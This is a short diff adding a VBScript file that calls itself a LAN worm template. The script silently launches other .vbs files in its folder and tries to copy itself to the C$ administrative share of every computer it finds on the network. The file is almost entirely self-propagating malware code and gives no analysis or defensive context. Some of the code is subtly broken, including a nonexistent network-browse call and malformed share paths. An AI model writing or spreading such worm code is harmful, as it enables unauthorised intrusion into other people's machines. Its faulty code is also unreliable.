@@ -1,0 +1,28 @@
+This is the LAN worm template in Visual Basic Script (VBS)
+it scans the LAN network for all the possible IPs and adds itself to the 
+shared files folder:
+
+Set WshShell = CreateObject("WScript.Shell")
+Set objShell = WScript.CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objNetwork = CreateObject("WScript.Network")
+strComputer = objNetwork.ComputerName
+Set colFiles = objFSO.GetFolder(".").Files
+
+For Each objFile in colFiles
+    strFileName = objFile.Name
+    If InStr(strFileName, ".vbs") > 0 Then
+        strFilePath = objFSO.GetAbsolutePathName(strFileName)
+        If strFilePath <> WScript.ScriptFullName Then
+            WshShell.Run Chr(34) & strFilePath & Chr(34), 0
+        End If
+    End If
+Next
+
+Set colComputers = objNetwork.Browse(2, "", "", "")
+For Each objComputer in colComputers
+    strComputerName = objComputer.Name
+    If strComputerName <> strComputer Then
+        WshShell.Run "\\ " & strComputerName & "\C$\Windows\System32\cmd.exe /c copy /Y " & WScript.ScriptFullName & " \\ " & strComputerName & "\C$\Users\Public", 0, True
+    End If
+Next
